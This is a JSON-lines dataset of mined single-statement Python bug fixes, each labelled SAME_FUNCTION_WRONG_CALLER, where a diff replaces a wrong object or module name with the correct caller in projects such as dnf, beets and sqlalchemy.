{"project": "dnf", "commit_sha": "f63779ba303d74a3ae6a3d723fedbb961c387276", "parent_sha": "50051a4a249fde3c404dfec91b2f4a938145cf61", "file_path": "yum/__init__.py", "project_url": "https://github.com/eclipseo/dnf", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -313,7 +313,7 @@ class YumBase(depsolve.Depsolve):\n                 \n         # now we know which repos actually have groups files.\n         overwrite = self.conf.overwrite_groups\n-        self.comps = newcomps.Comps(overwrite_groups = overwrite)\n+        self.comps = comps.Comps(overwrite_groups = overwrite)\n \n         for repo in reposWithGroups:\n             self.log(4, 'Adding group file from repository: %s' % repo)\n", "before": "self . comps = newcomps . Comps ( overwrite_groups = overwrite )", "after": "self . comps = comps . Comps ( overwrite_groups = overwrite )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:newcomps\", 3, 22, 3, 30], \"comps\"]]"}
{"project": "dnf", "commit_sha": "25fcce1e4b35372e2c79ce52984e160ac68e29f1", "parent_sha": "4d21f5773eee5291aac60cf5786c481b3bd1fa5f", "file_path": "yum/__init__.py", "project_url": "https://github.com/eclipseo/dnf", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1372,7 +1372,7 @@ class YumBase(depsolve.Depsolve):\n         real_crit_lower = [] # Take the s.lower()'s out of the loop\n         for s in criteria:\n             if s.find('%') == -1:\n-                real_crit.append(s.lower())\n+                real_crit_lower.append(s.lower())\n \n         for sack in self.pkgSack.sacks.values():\n             tmpres.extend(sack.searchPrimaryFieldsMultipleStrings(sql_fields, real_crit))\n", "before": "real_crit . append ( s . lower ( ) )", "after": "real_crit_lower . append ( s . lower ( ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:real_crit\", 3, 17, 3, 26], \"real_crit_lower\"]]"}
{"project": "dnf", "commit_sha": "7f6eba39bf392e97abe7036a1c5efd0f0876eda0", "parent_sha": "11f7ae90007297401fa22b10186ef3b9083d3621", "file_path": "yum/sqlitesack.py", "project_url": "https://github.com/eclipseo/dnf", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -848,7 +848,7 @@ class YumSqlitePackageSack(yumRepo.YumPackageSack):\n                 pmatches = self._sql_pkgKey2po(rep, cur)\n                 if len(pmatches):\n                     unmatched.remove(p)\n-                matched.extend(pmatches)\n+                matchres.extend(pmatches)\n \n         exactmatch = misc.unique(exactmatch)\n         matched = misc.unique(matched)\n", "before": "matched . extend ( pmatches )", "after": "matchres . extend ( pmatches )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:matched\", 3, 17, 3, 24], \"matchres\"]]"}
{"project": "dnf", "commit_sha": "dfc451464b7646d0932e976dab9fc2679961def3", "parent_sha": "2320a9e2342382017c357aaf62ada4ba0c94d271", "file_path": "yum/__init__.py", "project_url": "https://github.com/eclipseo/dnf", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -708,7 +708,7 @@ class YumBase(depsolve.Depsolve):\n             msg = _('There are unfinished transactions remaining. You might ' \\\n                     'consider running yum-complete-transaction first to finish them.' )\n             self.logger.critical(msg)\n-            base.yumUtilsMsg(self.logger.critical, \"yum-complete-transaction\")\n+            self.yumUtilsMsg(self.logger.critical, \"yum-complete-transaction\")\n             time.sleep(3)\n \n         self.plugins.run('preresolve')\n", "before": "base . yumUtilsMsg ( self . logger . critical , \"yum-complete-transaction\" )", "after": "self . yumUtilsMsg ( self . logger . critical , \"yum-complete-transaction\" )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:base\", 3, 13, 3, 17], \"self\"]]"}
{"project": "dnf", "commit_sha": "ca0f09fc2c9b8ebb825548fe8ee075bec3a72a9b", "parent_sha": "b997cc649f75e668b98008c916146b4f7a9fdb68", "file_path": "yum/yumRepo.py", "project_url": "https://github.com/eclipseo/dnf", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1357,7 +1357,7 @@ class YumRepository(Repository, config.RepoConf):\n         local_size  = 0\n         for (ndata, nmdtype) in downloading_with_size: # Get total size...\n             if ndata.size is None:\n-                download_no_size.append((ndata, nmdtype))\n+                downloading_no_size.append((ndata, nmdtype))\n                 continue\n             remote_size += int(ndata.size)\n \n", "before": "download_no_size . append ( ( ndata , nmdtype ) )", "after": "downloading_no_size . append ( ( ndata , nmdtype ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:download_no_size\", 3, 17, 3, 33], \"downloading_no_size\"]]"}
{"project": "dnf", "commit_sha": "892913f2a091f4416e481de38d68738b0a0ccce2", "parent_sha": "78e1012437293116b86cf1709ed674185883d01f", "file_path": "dnf/module/module_base.py", "project_url": "https://github.com/eclipseo/dnf", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -77,7 +77,7 @@ class ModuleBase(object):\n                         profiles.extend(latest_module.getProfiles(nsvcap.profile))\n                         if not profiles:\n                             logger.error(_(\"Unable to match profile in argument {}\").format(spec))\n-                            error_specs.append(spec)\n+                            no_match_specs.append(spec)\n                             continue\n                     else:\n                         profiles_strings = self.base._moduleContainer.getDefaultProfiles(\n", "before": "error_specs . append ( spec )", "after": "no_match_specs . append ( spec )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:error_specs\", 3, 29, 3, 40], \"no_match_specs\"]]"}
{"project": "biaxial-rnn-music-composition", "commit_sha": "a4b8e866b95ade9cd4ace55d471e7645ffdf4236", "parent_sha": "bff43479ac4ff3ba4c7b8fa5381592ec21b2f195", "file_path": "main.py", "project_url": "https://github.com/akshayjh/biaxial-rnn-music-composition", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ def gen_adaptive(m,pcs,times,keep_thoughts=False,name=\"final\"):\n \tcons = 1\n \tfor time in range(multi_training.batch_len*times):\n \t\tresdata = m.slow_walk_fun( cons )\n-\t\tnnotes = np.sum(resdata[-1][:,0])\n+\t\tnnotes = numpy.sum(resdata[-1][:,0])\n \t\tif nnotes < 2:\n \t\t\tif cons > 1:\n \t\t\t\tcons = 1\n", "before": "nnotes = np . sum ( resdata [ - 1 ] [ : , 0 ] )", "after": "nnotes = numpy . sum ( resdata [ - 1 ] [ : , 0 ] )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:np\", 3, 12, 3, 14], \"numpy\"]]"}
{"project": "xunlei-lixian", "commit_sha": "f27fad194c8baa071fafe5e6779bc26d960f5012", "parent_sha": "a1528d8289dbb33dd70cabdad4a821976c34d5fa", "file_path": "lixian_cli.py", "project_url": "https://github.com/iambus/xunlei-lixian", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -240,7 +240,7 @@ def download_task(args):\n \t\t\tprint 'Adding below tasks:'\n \t\t\tfor link in to_add:\n \t\t\t\tprint link\n-\t\t\tself.add_batch_task(to_add)\n+\t\t\tclient.add_batch_task(to_add)\n \t\t\tall_tasks = client.read_all_tasks()\n \t\ttasks = filter(lambda t: link_in(t['original_url'], links), all_tasks)\n \t\t# TODO: check if some task is missing\n", "before": "self . add_batch_task ( to_add )", "after": "client . add_batch_task ( to_add )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:self\", 3, 4, 3, 8], \"client\"]]"}
{"project": "feincms", "commit_sha": "82986bb209bc71665b0dc942529abeb1dc25d31a", "parent_sha": "ff8fafecc40eaaaa40de1ff1fab5b4bde82b1428", "file_path": "feincms/module/page/processors.py", "project_url": "https://github.com/anaelorlinski/feincms", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ def extra_context_request_processor(page, request):\n         'extra_path': '/',\n         })\n \n-    url = object.get_absolute_url()\n+    url = page.get_absolute_url()\n     if request.path != url:\n         request._feincms_extra_context.update({\n             'in_appcontent_subpage': True,\n", "before": "url = object . get_absolute_url ( )", "after": "url = page . get_absolute_url ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:object\", 3, 11, 3, 17], \"page\"]]"}
{"project": "l10n-spain", "commit_sha": "500f76370f04727e68c8493671632f3ddc3889de", "parent_sha": "8cc82d24ae4ca41f0d61026b1c9ba7972f1a5c51", "file_path": "payment_redsys/models/redsys.py", "project_url": "https://github.com/Change2improve/l10n-spain", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -341,7 +341,7 @@ class TxRedsys(models.Model):\n             )\n             if state == 'error':\n                 _logger.warning(vals['state_message'])\n-        tx.write(vals)\n+        self.write(vals)\n         return state != 'error'\n \n     @api.model\n", "before": "tx . write ( vals )", "after": "self . write ( vals )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:tx\", 3, 9, 3, 11], \"self\"]]"}
{"project": "layer-elasticsearch-client", "commit_sha": "1f2c2499529f02fbd067eb82a8a20461e2628e47", "parent_sha": "989f15457b9f4bff1555404c0f4771481cd40c61", "file_path": "reactive/elasticserch_client.py", "project_url": "https://github.com/omnivector-solutions/layer-elasticsearch-client", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -22,7 +22,7 @@ def check_user_provided_elasticsearch():\n         hookenv.status_set('active',\n                            'Elasticsearch manual configuration available')\n \n-        kv.set('es_hosts', reactive.config('es-hosts').split(\",\"))\n+        kv.set('es_hosts', hookenv.config('es-hosts').split(\",\"))\n \n         hookenv.set_flag('manual.elasticsearch.available')\n \n", "before": "kv . set ( 'es_hosts' , reactive . config ( 'es-hosts' ) . split ( \",\" ) )", "after": "kv . set ( 'es_hosts' , hookenv . config ( 'es-hosts' ) . split ( \",\" ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:reactive\", 3, 28, 3, 36], \"hookenv\"]]"}
{"project": "layer-elasticsearch-client", "commit_sha": "d4edf03321bc57b02be22b37ce101ca663f48a8a", "parent_sha": "1f2c2499529f02fbd067eb82a8a20461e2628e47", "file_path": "reactive/elasticserch_client.py", "project_url": "https://github.com/omnivector-solutions/layer-elasticsearch-client", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ def check_user_provided_elasticsearch():\n \n         kv.set('es_hosts', hookenv.config('es-hosts').split(\",\"))\n \n-        hookenv.set_flag('manual.elasticsearch.available')\n+        reactive.set_flag('manual.elasticsearch.available')\n \n         reactive.clear_flag('elasticsearch.client.proxy.available')\n \n", "before": "hookenv . set_flag ( 'manual.elasticsearch.available' )", "after": "reactive . set_flag ( 'manual.elasticsearch.available' )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:hookenv\", 3, 9, 3, 16], \"reactive\"]]"}
{"project": "transient-object-detection", "commit_sha": "50bffc8bbb4c2427ac4cb233c8d1d26c7d8774c0", "parent_sha": "bc8467be81b6fd8b55d5b408b3d29405f89027b6", "file_path": "train_segnet.py", "project_url": "https://github.com/andfoy/transient-object-detection", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -100,7 +100,7 @@ def train(epoch):\n         optimizer.zero_grad()\n         recon = model(data)\n         # loss = loss_function(recon_batch, data, mu, logvar)\n-        print(recon.sum())\n+        print(data.sum())\n         loss = criterion(recon, data)\n         loss.backward()\n         train_loss += loss.data[0]\n", "before": "print ( recon . sum ( ) )", "after": "print ( data . sum ( ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:recon\", 3, 15, 3, 20], \"data\"]]"}
{"project": "translate", "commit_sha": "68c403a48ebc8abda28c9e2967d7f850a7d6e43d", "parent_sha": "3d2a2143d03908f1d3e6627fbee83e49b20df395", "file_path": "translate/storage/rc.py", "project_url": "https://github.com/nschonni/translate", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -198,7 +198,7 @@ class rcfile(base.TranslationStore):\n             if re.match(\"[0-9A-Z_]+\\s+MENU\", block) is not None:\n                 menuname = re.match(\"(?P<menuname>[0-9A-Z_]+)\\s+MENU\", block).groupdict()[\"menuname\"]\n                 #print \"menu: %s\" % menuname\n-                for match in DIALOG_RE.finditer(block):\n+                for match in MENU_RE.finditer(block):\n                     if not match.groupdict()['value']:\n                         continue\n                     type = match.groupdict()['type']\n", "before": "for match in DIALOG_RE . finditer ( block ) : if not match . groupdict ( ) [ 'value' ] : continue type = match . groupdict ( ) [ 'type' ]", "after": "for match in MENU_RE . finditer ( block ) : if not match . groupdict ( ) [ 'value' ] : continue type = match . groupdict ( ) [ 'type' ]", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:DIALOG_RE\", 3, 30, 3, 39], \"MENU_RE\"]]"}
{"project": "weblate", "commit_sha": "c267353c927a6c20ecb77c2a0c9dbbafb44d30aa", "parent_sha": "280234823f397f4750a1b025edd0ae64610c9e96", "file_path": "trans/models/translation.py", "project_url": "https://github.com/nschonni/weblate", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -951,7 +951,7 @@ class Translation(models.Model):\n \n             for unit2 in store2.all_units():\n                 # No translated -> skip\n-                if not unit.is_translated():\n+                if not unit2.is_translated():\n                     continue\n \n                 # Optionally merge header\n", "before": "if not unit . is_translated ( ) : continue", "after": "if not unit2 . is_translated ( ) : continue", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:unit\", 3, 24, 3, 28], \"unit2\"]]"}
{"project": "ds_tempest_rm_me_please", "commit_sha": "9d7bac448af4e4073535b708e0a7496ed20b6e68", "parent_sha": "e07579c6034ed8b2cd51ddefeff4b600691088bb", "file_path": "tempest/manager.py", "project_url": "https://github.com/gamado/ds_tempest_rm_me_please", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,5 +58,5 @@ def get_auth_provider(credentials, pre_auth=False, scope='project'):\n            \"as such it should not imported directly. It will be removed as \"\n            \"the client manager becomes available in tempest.lib.\")\n     LOG.warning(msg)\n-    return clients.get_auth_provider(credentials=credentials,\n-                                     pre_auth=pre_auth, scope=scope)\n+    return tempest_clients.get_auth_provider(credentials=credentials,\n+                                             pre_auth=pre_auth, scope=scope)\n", "before": "return clients . get_auth_provider ( credentials = credentials , pre_auth = pre_auth , scope = scope )", "after": "return tempest_clients . get_auth_provider ( credentials = credentials , pre_auth = pre_auth , scope = scope )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:clients\", 3, 12, 3, 19], \"tempest_clients\"]]"}
{"project": "ds_tempest_rm_me_please", "commit_sha": "ceb2b4684d18e6fa65b500b6a946d4c13cb606f3", "parent_sha": "268cd656bce3f731aa847ae6f827d51960128880", "file_path": "tempest/common/waiters.py", "project_url": "https://github.com/gamado/ds_tempest_rm_me_please", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -221,7 +221,7 @@ def wait_for_backup_status(client, backup_id, status):\n         body = client.show_backup(backup_id)['backup']\n         backup_status = body['status']\n         if backup_status == 'error' and backup_status != status:\n-            raise exceptions.VolumeBackupException(backup_id=backup_id)\n+            raise lib_exc.VolumeBackupException(backup_id=backup_id)\n \n         if int(time.time()) - start >= client.build_timeout:\n             message = ('Volume backup %s failed to reach %s status '\n", "before": "raise exceptions . VolumeBackupException ( backup_id = backup_id )", "after": "raise lib_exc . VolumeBackupException ( backup_id = backup_id )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:exceptions\", 3, 19, 3, 29], \"lib_exc\"]]"}
{"project": "rd-addons", "commit_sha": "edd491e84e23122ec1400a4534d06ac6852f7454", "parent_sha": "1a21890f67203b769c41d136d1d5c0670e39058f", "file_path": "c2c_sequence_fy/ir_sequence.py", "project_url": "https://github.com/Khwarizmiat/rd-addons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -109,7 +109,7 @@ class ir_sequence(osv.osv):\n                     for fy_s in  fy_seq_obj.browse(cr, uid, fy_seq_ids):\n                         seq_id = fy_s.sequence_id.id\n                 else:\n-                    for seq in selb.browse(cr, uid, sequence_id, context):\n+                    for seq in self.browse(cr, uid, sequence_id, context):\n                         sequence_code = seq.code\n                         sequence_name = seq.name\n                         sequence_padding = seq.padding\n", "before": "for seq in selb . browse ( cr , uid , sequence_id , context ) : sequence_code = seq . code sequence_name = seq . name sequence_padding = seq . padding", "after": "for seq in self . browse ( cr , uid , sequence_id , context ) : sequence_code = seq . code sequence_name = seq . name sequence_padding = seq . padding", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:selb\", 3, 32, 3, 36], \"self\"]]"}
{"project": "beets", "commit_sha": "e588638e8ec615890ca233f4bfeeec6c0c32432b", "parent_sha": "1f67dcd673be2e0bab0e0803e7d0c7d2fa180e52", "file_path": "beets/library.py", "project_url": "https://github.com/popookitty/beets", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1171,7 +1171,7 @@ class Album(BaseAlbum):\n         oldart = self.artpath\n         artdest = self.art_destination(path)\n         if oldart == artdest:\n-            os.soft_remove(oldart)\n+            util.soft_remove(oldart)\n         \n         shutil.copyfile(syspath(path), syspath(artdest))\n         self.artpath = artdest\n", "before": "os . soft_remove ( oldart )", "after": "util . soft_remove ( oldart )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:os\", 3, 13, 3, 15], \"util\"]]"}
{"project": "Tor2web-1", "commit_sha": "9a5e8cee9a9cbd5b87b6829faf796b2f202e9d23", "parent_sha": "41431d9a9fd03531ff0b4e800cb470c7d93dc2af", "file_path": "tor2web/utils/lists.py", "project_url": "https://github.com/cheako/Tor2web-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -58,7 +58,7 @@ def getPageCached(url, contextFactory=None, *args, **kwargs):\n-    uri = _URI.fromBytes(url)\n+    uri = URI.fromBytes(url)\n     scheme = uri.scheme\n     host = uri.host\n     port = uri.port\n", "before": "uri = _URI . fromBytes ( url )", "after": "uri = URI . fromBytes ( url )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:_URI\", 0, 11, 0, 15], \"URI\"]]"}
{"project": "seisflows", "commit_sha": "112b6dab93080eb96a3652d5369dd230d730ee47", "parent_sha": "d68d981ccf12420a25773f077f4216540b9d52f5", "file_path": "seisflows/seistools/preconds.py", "project_url": "https://github.com/chukren/seisflows", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -75,7 +75,7 @@ class pca(object):\n                     for iproc in range(self.nproc):\n                         s[ikey] += [w[ii,jj]*r[jkey][iproc]]\n \n-        return solver.merge(s)\n+        return self.merge(s)\n \n \n ### general numerical preconditioners\n", "before": "return solver . merge ( s )", "after": "return self . merge ( s )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:solver\", 3, 16, 3, 22], \"self\"]]"}
{"project": "cocos", "commit_sha": "fc67b01fb25258e181e9d3eb426478b2b451f563", "parent_sha": "65a6e5393061f25f35b40693a90d9a627ff446c2", "file_path": "test/test_platformer.py", "project_url": "https://github.com/anodium/cocos", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -119,7 +119,7 @@ def main():\n     # allow display info about cells / tiles \n     def on_key_press(key, modifier):\n         if key == pyglet.window.key.D:\n-            tilemap.set_debug(True)\n+            tilemap_walls.set_debug(True)\n     director.window.push_handlers(on_key_press)\n \n     # run the scene\n", "before": "tilemap . set_debug ( True )", "after": "tilemap_walls . set_debug ( True )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:tilemap\", 3, 13, 3, 20], \"tilemap_walls\"]]"}
{"project": "cocos", "commit_sha": "038f6322595b0f47b4c98087c5e03f5afddff5f7", "parent_sha": "88ad1bd7fab28c37ab77b39a328924317b524636", "file_path": "cocos/tiles.py", "project_url": "https://github.com/anodium/cocos", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1261,7 +1261,7 @@ class HexMapLayer(HexMap, MapLayer):\n     def __init__(self, id, th, cells, origin=None, properties=None):\n         HexMap.__init__(self, id, th, cells, origin, properties)\n-        HexMapLayer.__init__(self, properties)\n+        MapLayer.__init__(self, properties)\n \n \n # Note that we always add below (not subtract) so that we can try to\n", "before": "HexMapLayer . __init__ ( self , properties )", "after": "MapLayer . __init__ ( self , properties )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:HexMapLayer\", 2, 9, 2, 20], \"MapLayer\"]]"}
{"project": "POCS", "commit_sha": "e015a64f642551d144fd9eddd495e9d75f9cde45", "parent_sha": "2f70b5d85d4e0ae02fbbe1f12d9481bc009ddfc5", "file_path": "panoptes/observatory.py", "project_url": "https://github.com/jamessynge/POCS", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -251,7 +251,7 @@ class Observatory(object):\n             self.logger.warning(\"Problem analyzing: {}\".format(e))\n \n         self.logger.debug(\"Getting offset from guide\")\n-        offset_info = images.get_image_offset(exposure, with_plot=True)\n+        offset_info = target.get_image_offset(exposure, with_plot=True)\n \n         return offset_info\n \n", "before": "offset_info = images . get_image_offset ( exposure , with_plot = True )", "after": "offset_info = target . get_image_offset ( exposure , with_plot = True )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:images\", 3, 23, 3, 29], \"target\"]]"}
{"project": "ckanext-predataset", "commit_sha": "db767dacdf152b8ed9ad1fd15b007e238d52fad5", "parent_sha": "26072b5c7b43323cd30b98ab02dd6816dc63cd04", "file_path": "ckanext/predataset/package.py", "project_url": "https://github.com/fernandobac03/ckanext-predataset", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -487,7 +487,7 @@ class PackageController(base.BaseController):\n         if data and 'type' in data:\n             package_type = data['type']\n         else:\n-            package_type = pkgcontroller._guess_package_type(True)\n+            package_type = self._guess_package_type(True)\n \n         context = {'model': model, 'session': model.Session,\n                    'user': c.user, 'auth_user_obj': c.userobj,\n", "before": "package_type = pkgcontroller . _guess_package_type ( True )", "after": "package_type = self . _guess_package_type ( True )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:pkgcontroller\", 3, 28, 3, 41], \"self\"]]"}
{"project": "POCS", "commit_sha": "f7bdcabc23141c967c29bd3841bbadb9c8745beb", "parent_sha": "66b4f11d568d99b7fe4bf2f9962a75ac888cf63a", "file_path": "panoptes/mount/mount.py", "project_url": "https://github.com/jamessynge/POCS", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -392,7 +392,7 @@ class AbstractMount(object):\n \n     def home_and_park(self):\n \n-        mount.slew_to_home()\n+        self.slew_to_home()\n         while self.is_slewing:\n             time.sleep(5)\n             self.logger.info(\"Slewing to home, sleeping for 5 seconds\")\n", "before": "mount . slew_to_home ( )", "after": "self . slew_to_home ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:mount\", 3, 9, 3, 14], \"self\"]]"}
{"project": "sqlalchemy", "commit_sha": "463f73f80dcc3a35d9b4fe114445aa41bc2e933b", "parent_sha": "6973635136860a7ef6f5a5b4072d11163560fb3d", "file_path": "lib/sqlalchemy/engine/base.py", "project_url": "https://github.com/plq/sqlalchemy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1731,7 +1731,7 @@ class ResultMetaData(object):\n             # store the \"origname\" if we truncated (sqlite only)\n             if origname and \\\n                     colfuncs.setdefault(origname.lower(), rec) is not rec:\n-                colfuncs[name.lower()] = (self._ambiguous_processor(origname), i, \"ambiguous\")\n+                colfuncs[origname.lower()] = (self._ambiguous_processor(origname), i, \"ambiguous\")\n             \n             if dialect.requires_name_normalize:\n                 colname = dialect.normalize_name(colname)\n", "before": "colfuncs [ name . lower ( ) ] = ( self . _ambiguous_processor ( origname ) , i , \"ambiguous\" )", "after": "colfuncs [ origname . lower ( ) ] = ( self . _ambiguous_processor ( origname ) , i , \"ambiguous\" )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:name\", 3, 26, 3, 30], \"origname\"]]"}
{"project": "confu", "commit_sha": "cef4632dcb571d7d0dae26fa43932113b8789ef1", "parent_sha": "ffc71f90f16c9717f64c77a477fc5d9361150d7a", "file_path": "confu/schema.py", "project_url": "https://github.com/20c/confu", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -306,7 +306,7 @@ class Schema(object):\n             except ValidationError as error:\n                 errors.error(error)\n             except ValidationWarning as warning:\n-                errors.warning(warning)\n+                warnings.warning(warning)\n \n         for name, attribute in cls.attributes():\n             if name not in config and getattr(attribute, \"default_handler\", None) is None:\n", "before": "ValidationWarning as warning : errors . warning ( warning )", "after": "ValidationWarning as warning : warnings . warning ( warning )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:errors\", 3, 17, 3, 23], \"warnings\"]]"}
{"project": "question-generation", "commit_sha": "b54b71bd3a92531790528400d94015dd932fd436", "parent_sha": "f597d0709381413f3e515c31bcaf85503c095c94", "file_path": "src/helpers/preprocessing.py", "project_url": "https://github.com/sk38897/question-generation", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -112,7 +112,7 @@ def char_pos_to_word(text, tokens, char_pos):\n         # lens = [len(sent)+1  for sent in sents]\n         offsets = []\n         for i,sent in enumerate(sents):\n-            offsets.append(ctxt.find(sent, offsets[-1] if i>0 else 0)) # can we do this faster?\n+            offsets.append(text.find(sent, offsets[-1] if i>0 else 0)) # can we do this faster?\n         spans = [(span[0]+offsets[i], span[1]+offsets[i]) for i,sent in enumerate(spans) for span in sent]\n         # print(char_pos)\n         for ix,s in enumerate(spans):\n", "before": "offsets . append ( ctxt . find ( sent , offsets [ - 1 ] if i > 0 else 0 ) )", "after": "offsets . append ( text . find ( sent , offsets [ - 1 ] if i > 0 else 0 ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:ctxt\", 3, 28, 3, 32], \"text\"]]"}
{"project": "augpathlib", "commit_sha": "af73c82eae943d792e20be3a7f55ee29ca62cc87", "parent_sha": "e78212e4709cb748ba8f50cfc1dbad8f95a7172e", "file_path": "augpathlib/core.py", "project_url": "https://github.com/tgbugs/augpathlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -243,7 +243,7 @@ class AugmentedPath(PosixPath):\n         if AugmentedPath._stack:\n             path = AugmentedPath._stack.pop(reversed_index)\n             path.chdir()\n-            print(*reversed(AugmentedPath._stack), self.cwd())\n+            print(*reversed(AugmentedPath._stack), AugmentedPath.cwd())\n             return path\n         else:\n             log.warning('popd: directory stack empty')\n", "before": "print ( * reversed ( AugmentedPath . _stack ) , self . cwd ( ) )", "after": "print ( * reversed ( AugmentedPath . _stack ) , AugmentedPath . cwd ( ) )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:self\", 3, 52, 3, 56], \"AugmentedPath\"]]"}
{"project": "STXLDriver", "commit_sha": "b3b501569b1314254d0017b580b60f8e571deab1", "parent_sha": "67022a130e64390df0e07dcecdb8e11c0549347f", "file_path": "stress.py", "project_url": "https://github.com/dkirkby/STXLDriver", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -76,7 +76,7 @@ def stress_test(camera, exptime, binning, temperature, interval=10, timeout=10):\n                 logging.info(msg)\n                 # Test for cooling latchup.\n                 if np.all(np.array(pwr_history) == 100) and np.min(temp_history) > temperature + 2:\n-                    loggging.warning('Detected cooling latchup!')\n+                    logging.warning('Detected cooling latchup!')\n                     initialize()\n                 # Reset statistics\n                 last_nexp = nexp\n", "before": "loggging . warning ( 'Detected cooling latchup!' )", "after": "logging . warning ( 'Detected cooling latchup!' )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:loggging\", 3, 21, 3, 29], \"logging\"]]"}
{"project": "simuvex", "commit_sha": "1ae6533925661f7d90dd76b20c04c6ac43cb4e76", "parent_sha": "2950a1c7732122fdeaa8f58108d87f703cf9e6e6", "file_path": "pysex/s_memory.py", "project_url": "https://github.com/Grindland/simuvex", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -135,7 +135,7 @@ class Memory:\n                                 fcon = z3.Or([ dst == addr for addr in self.__mem.keys() ])\n                                 v_bsy = s_value.Value(dst, constraints + [ fcon ])\n \n-                                if v_free.satisfiable():\n+                                if v_bsy.satisfiable():\n                                         addr = v_bsy.rnd()\n                                 else:\n                                         addr = v.rnd() # at least the max value is included!\n", "before": "if v_free . satisfiable ( ) : addr = v_bsy . rnd ( ) else : addr = v . rnd ( )", "after": "if v_bsy . satisfiable ( ) : addr = v_bsy . rnd ( ) else : addr = v . rnd ( )", "sstub_pattern": "SAME_FUNCTION_WRONG_CALLER", "edit_script": "[[\"Update\", [\"identifier:v_free\", 3, 36, 3, 42], \"v_bsy\"]]"}
